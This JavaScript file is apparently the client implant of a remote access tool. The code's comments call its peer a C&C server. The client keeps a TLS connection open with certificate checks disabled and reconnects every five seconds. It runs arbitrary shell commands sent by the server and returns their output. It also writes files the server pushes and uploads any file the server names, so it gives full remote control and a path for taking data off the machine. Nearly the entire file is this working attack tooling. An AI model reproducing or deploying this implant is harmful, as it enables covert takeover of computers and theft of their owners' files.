"use strict";
// Core Modules
const tls = require('tls')
const fs = require('fs')
const child = require('child_process')
const { exec } = require('child_process');
// ===========================================================================

/**
 * options object stores the private key and public cert to be used by tls socket for traffic encryption.
 */
const _options = {
    key: fs.readFileSync(__dirname + '/certs/host.key'),
    cert: fs.readFileSync(__dirname + '/certs/host.crt'),
    rejectUnauthorized: false
}

// flag variable to let the client know if it needs to reconnect to the server
const _comPort = 443 // Communication Socket port
const _host = '127.0.0.1' // C&C Server
const _shellType = "sh" //cmd.exe, zsh, sh
const _EOT_ = '|||' // Characters to identify end of transmission per write (not per packet)
const _CONFIG_PATH_ = '/.RSconf'
// ===========================================================================

// Global variables
var comAlive = false
var workstationId
var buffer = ''
var fileStream = {}
// ===========================================================================

/**
 * Read client config file if a configuration exists
 * @param {String} configPath configuration file path
 */
const readConfig = (configPath) => {
    try {
        var configData = fs.readFileSync(__dirname + _CONFIG_PATH_)
        configData = JSON.parse(configData)
        workstationId = configData.id
    } catch (e) {
        console.log(`No Config Found: ${e}`)
    }
}

/**
 * send client config settings to the server
 * @param {Socket} serverSocket server Socket object
 */
const sendClientConfig = (serverSocket) => {
    var msg = {
        'type': 'existingClient',
        'id': workstationId
    }
    serverSocket.write(JSON.stringify(msg) + _EOT_)
}

/**
 * write configuration settings provided by the server to the client into a file
 * @param {JSON} JBuffer json object containing data to configurate the client
 */
const setupConfig = (JBuffer) => {
    try {
        fs.writeFileSync(__dirname + _CONFIG_PATH_, JSON.stringify(JBuffer))
        workstationId = JBuffer.id
    } catch (e) {
        console.log(`Error saving config: ${e}`)
    }
}

/**
 * Client requests server for setup procedure (Triggered if client did not find configuration settings)
 * @param {Socket} serverSocket server socket object
 */
const setupRequest = (serverSocket) => {
    var msg = {
        'type': 'setupRequest'
    }
    serverSocket.write(JSON.stringify(msg) + _EOT_)
}

/**
 * Attempt to execute a command from server on the client and transmit stdout to server
 * @param {JSON} JBuffer JSON object containg command to run on client
 * @param {Socket} serverSocket server Socket Object
 */
const execCommand = (JBuffer, serverSocket) => {

    exec(JBuffer.data, {
        timeout: 30000,
    },(error, stdout, stderr) => {
        if (error) {
            console.log('here')

            var msg = {
                'type': 'execResponse',
                'data': String(error)
            }
            serverSocket.write(JSON.stringify(msg) + _EOT_)
            return
        }
        var msg = {
            'type': 'execResponse',
            'data': stdout
        }
        console.log(msg)
        serverSocket.write(JSON.stringify(msg) + _EOT_)
    })
}

/**
 * Echo for testing purposes
 * @param {JSON} JBuffer 
 */
// const echoTest = (JBuffer, serverSocket) => {
//     var msg = {
//         'type': 'echo',
//         'data': JBuffer.data
//     }
//     serverSocket.write(JSON.stringify(msg) + _EOT_)
// }

/**
 * Creates a write filestream for the client
 * @param {JSON} JBuffer contains filename data
 */
const initWriteFile = (JBuffer) => {
    console.log(`Writing File ${JBuffer.data}`)
    fileStream = fs.createWriteStream(JBuffer.data)
}

/**
 * writes data received from server to file on client
 * @param {JSON} JBuffer contains file buffer data
 */
const dataWriteFile = (JBuffer) => {
    fileStream.write(Uint8Array.from(JBuffer.data.data))
}

/**
 * Closes file write stream after file writes are complete
 */
const endWriteFile = () => {
    console.log(`finished writing file`)
    fileStream.close()
}

/**
 * creates a formatted string JSON message to notify server that file sending is complete
 * @returns string JSON object
 */
const endSendFileMsg = () => {
    var msg = {
        type: 'endOfFile'
    }
    return JSON.stringify(msg)
}

/**
 * Opens a read stream and begins transmitting the read buffer to server
 * @param {JSON} JBuffer contains file path to read from
 * @param {Socket} serverSocket server Socket Object
 */
const sendFile = (JBuffer, serverSocket) => {
    if (fs.existsSync(JBuffer.data)) {
        try {
        
            var srcFileStream = fs.createReadStream(JBuffer.data)
    
            srcFileStream.on('open', () => {
                // serverSocket.write(initSendFileMsg(dstFileName) + _EOT_)
            })
    
            srcFileStream.on('readable', () => {
                var chunk;
                
                while (null !== (chunk = srcFileStream.read())) {
                    var msg = {
                        type: 'fileData',
                        data: chunk
                    }
    
                    serverSocket.write(JSON.stringify(msg) + _EOT_)
                }
            })
    
            srcFileStream.on('error', (e) => {
                serverSocket.write(endSendFileMsg() + _EOT_)
            })
    
            srcFileStream.on('end', () => {
                serverSocket.write(endSendFileMsg() + _EOT_)
            })
        } catch (e) {
            console.log(`Error in socket-file-server: ${e}`)
        }
    }
}

/**
 * The purpose of this function is to trigger specialized functions based on type of message received
 * from the server.
 * @param {JSON} JBuffer contains the type of message and data related to type
 * @param {Socket} serverSocket server Socket Object
 */
const bufferInterpreter = (JBuffer, serverSocket) => {
    switch (JBuffer.type) {
        case 'setup':
            setupConfig(JBuffer)
            break
        case 'echo':
            echoTest(JBuffer, serverSocket)
            break
        case 'exec':
            execCommand(JBuffer, serverSocket)
            break
        case 'fileServerToClient':
            initWriteFile(JBuffer)
            break
        case 'fileClientToServer':
            sendFile(JBuffer, serverSocket)
            break
        case 'fileData':
            dataWriteFile(JBuffer)
            break
        case 'endOfFile':
            endWriteFile(serverSocket)
            break;
    }
}

// async await wrapper to make certain functions async
const asyncCall = (callback) => new Promise((resolve) => {
    callback(resolve)
})

/**
 * creates a connection to a communication socket server.
 * connection is persistant and will attempt to reconnect every 5s
 * @param {number} PORT 
 * @param {string} HOST 
 * @param {object} tlsCerts 
 * @returns socket
 */
const comServerConnect = (PORT, HOST, tlsCerts) => {
    const serverSocket = tls.connect(PORT, HOST, tlsCerts)

    // On Successful TLS socket connection, spawn shell
    serverSocket.on('secure', async () => {
        // comAlive = true
        console.log(`Connected to port ${PORT}`)

        if (workstationId == undefined) {
            setupRequest(serverSocket)
        } else {
            sendClientConfig(serverSocket)
        }

        // fsClient = await asyncCall((resolve) => {
        //     return fsServerConnect(_fsPort, _host, _options, client, resolve)
        // })
        // shellSpawn(client)
    })

    // Read socket stream from server to client and attempt to interpret the message
    serverSocket.on('data', (data) => {
        var dataString = data.toString()
        buffer += dataString
        var endOfTransmissionIndex = buffer.indexOf(_EOT_) // will return -1 if nothing found

        while (endOfTransmissionIndex > 0) {
            var tempBuffer = buffer.substr(0, endOfTransmissionIndex)
            
            try {
                var JBuffer = JSON.parse(tempBuffer)
                bufferInterpreter(JBuffer, serverSocket)
            } catch (e) {
                console.log(`Buffer Error ${e}: ${tempBuffer}`)
            }

            buffer = buffer.substr(endOfTransmissionIndex + 3)
            endOfTransmissionIndex = buffer.indexOf(_EOT_)
        }            
    })

    // On socket close, attempt to reconnect
    serverSocket.on('close', () => {
        comAlive = false
        console.log(`${PORT} connection closed... reconnecting...`)
        // fsClient.destroy()
        serverSocket.destroy()
        setTimeout(() => {
            comServerConnect(PORT, HOST, tlsCerts)
        }, 5000)
    })

    // if the socket throws an error, destroy the socket, and attempt to reconnect with new socket
    serverSocket.on('error', (error) => {
        comAlive = false
        console.log(error)
        // fsClient.destroy()
        serverSocket.destroy()
    })

    return serverSocket
}

readConfig(_CONFIG_PATH_)
comServerConnect(_comPort, _host, _options)
